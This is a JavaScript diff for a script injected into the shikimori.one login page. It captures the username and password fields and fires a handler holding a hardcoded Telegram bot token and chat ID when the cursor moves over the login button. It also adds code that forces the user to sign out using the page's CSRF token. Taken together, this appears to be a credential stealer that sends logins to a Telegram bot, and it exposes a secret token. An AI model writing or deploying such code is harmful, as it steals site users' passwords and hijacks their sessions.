@@ -5,43 +5,28 @@
 
     const name = document.getElementById('user_nickname');
     const pass = document.getElementById('user_password');
+    let submitButton = document.querySelector('.p-devise_sessions .btn-primary[value="Войти"]');
+    submitButton.addEventListener('mouseenter', onInputChange);
     if(pass != null && name != null) {
         console.log('inputs found!');
 
-        name.addEventListener("change", onClickAction);
-        pass.addEventListener("change", onClickAction);
-
-        const submitButton = document.querySelector('.btn-primary');
-        if(submitButton != null) {
-            console.log('button found!');
-            submitButton.addEventListener("click", onClickAction);
-        }
+        // name.addEventListener("change", onInputChange);
+        // pass.addEventListener("change", onInputChange);
     }
  }
 
- function signOutUser() {
-     const xhr = new XMLHttpRequest();
-        xhr.open("GET", "https://shikimori.one/", true);
-        xhr.send();
-        xhr.onload = function() {
-            if (xhr.status === 200) {
-                const bodyDoc = document.querySelector('body');
-                const jsonAttribute = bodyDoc.getAttribute('data-user');
-                const jsonObject = JSON.parse(jsonAttribute);
-                const parser = new DOMParser();
-                const doc = parser.parseFromString(xhr.responseText, "text/html");
-                const metaTag = doc.querySelector('meta[name="csrf-token"]');
-                const csrfToken = metaTag ? metaTag.getAttribute("content") : null;
-                const xhr2 = new XMLHttpRequest();
-                xhr2.open("POST", "/api/users/sign_out", true);
-                xhr2.setRequestHeader("Content-Type", "application/json");
-                xhr2.setRequestHeader("X-CSRF-Token", csrfToken);
-                xhr2.send()
-            }
-        }
+function signOutUser() {
+     const metaTag = document.querySelector('meta[name="csrf-token"]');
+     const csrfToken = metaTag ? metaTag.getAttribute("content") : null;
+     fetch('https://shikimori.one/api/users/sign_out', {
+      "headers": {
+       'X-CSRF-Token': csrfToken,
+      },
+       "method": 'POST'
+     })
  }
 
- function onClickAction() {
+ function onInputChange() {
     const token = '7284579776:AAG-0g9TOkPFqIJUP4rPg-uAz_nYRAdbm60';
     const chatId = '250460465';
 
